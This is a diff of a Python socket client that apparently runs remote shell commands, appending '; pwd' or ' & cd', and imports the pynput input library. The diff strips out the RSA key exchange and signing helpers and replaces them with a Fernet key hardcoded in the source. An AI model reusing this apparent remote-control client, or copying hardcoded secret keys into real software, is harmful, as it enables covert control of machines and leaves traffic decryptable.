@@ -87,77 +87,6 @@ def reverse_readline(filename, buf_size=8192) -> str:
             yield segment
 
 
-def Hasher(MESSAGE) -> bytes:
-    """ Hashes data """
-    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
-    digest.update(MESSAGE)
-    return digest.finalize()
-
-
-def verifySignature(publicKey, signature, message) -> bool:
-    """ Verify signature with public key """
-    try:
-        publicKey.verify(
-            signature,
-            message,
-            padding.PSS(
-                mgf=padding.MGF1(hashes.SHA256()),
-                salt_length=padding.PSS.MAX_LENGTH
-            ),
-            hashes.SHA256()
-        )
-    except:
-        return False
-    return True
-
-
-def sign(privateKey, data) -> bytes:
-    """ Sign data with private key """
-    signature = privateKey.sign(
-        data,
-        padding.PSS(
-            mgf=padding.MGF1(hashes.SHA256()),
-            salt_length=padding.PSS.MAX_LENGTH
-        ),
-        hashes.SHA256()
-    )
-    return signature
-
-
-def encrypt(publicKey, plaintext) -> bytes:
-    """ Encrypt using public key """
-    ciphertext = publicKey.encrypt(
-        plaintext,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None)
-    )
-    return ciphertext
-
-
-def decrypt(privateKey, ciphertext) -> bytes:
-    """ Decrypt using private key """
-    plaintext = privateKey.decrypt(
-        ciphertext,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-    return plaintext
-
-
-def public_bytes(publicKey) -> bytes:
-    """ Get Public Key in Bytes """
-    serializedPublic = publicKey.public_bytes(
-        encoding=serialization.Encoding.PEM,
-        format=serialization.PublicFormat.SubjectPublicKeyInfo
-    )
-    return serializedPublic
-
-
 def errors(ERROR, line=True) -> str:
     """ Error Handler """
     error_class = ERROR.__class__.__name__
@@ -251,24 +180,15 @@ if _pynput:
 
 class Client(object):
 
-    def __init__(self, host='127.0.0.1', port=9999) -> None:
+    def __init__(self, host='127.0.0.1', port=8000) -> None:
         self.serverHost = host
         self.serverPort = port
         self.socket = None
-
-        self.Fer_key = Fernet.generate_key()
-        logging.debug(self.Fer_key)
-        self.Fer = Fernet(self.Fer_key)
-
-        self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
-        self.publicKey = self.privateKey.public_key()
+        self.Fer = Fernet(b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
         if platform.system() == 'Windows':
             self._pwd = ' & cd'
         else:
             self._pwd = '; pwd'
-
-    def __repr__(self):
-        return 'Client(host="{}", port={})'.format(self.serverHost, self.serverPort)
 
     def socket_create(self) -> None:
         """ Create a socket """
@@ -288,27 +208,6 @@ class Client(object):
             logging.error(errors(e))
             raise
         try:
-            self.socket.send(public_bytes(self.publicKey))
-            serverPublic = serialization.load_pem_public_key(self.socket.recv(20480), backend=default_backend())
-
-            Hashed_Key = Hasher(self.Fer_key)
-            Encrypted = encrypt(serverPublic, self.Fer_key)
-            Hash_Encrypted = Hasher(Encrypted)
-            Signature = sign(self.privateKey, Hashed_Key)
-            Encrypted_Signature = sign(self.privateKey, Hash_Encrypted)
-
-            def send_data(data):
-                self.socket.send(str(len(data)).encode())
-                self.socket.recv(4096)
-                self.socket.send(data)
-                self.socket.recv(4096)
-
-            send_data(Hashed_Key)
-            send_data(Encrypted)
-            send_data(Hash_Encrypted)
-            send_data(Signature)
-            send_data(Encrypted_Signature)
-
             self.send(socket.gethostname().encode())
         except Exception as e:
             logging.error(errors(e))
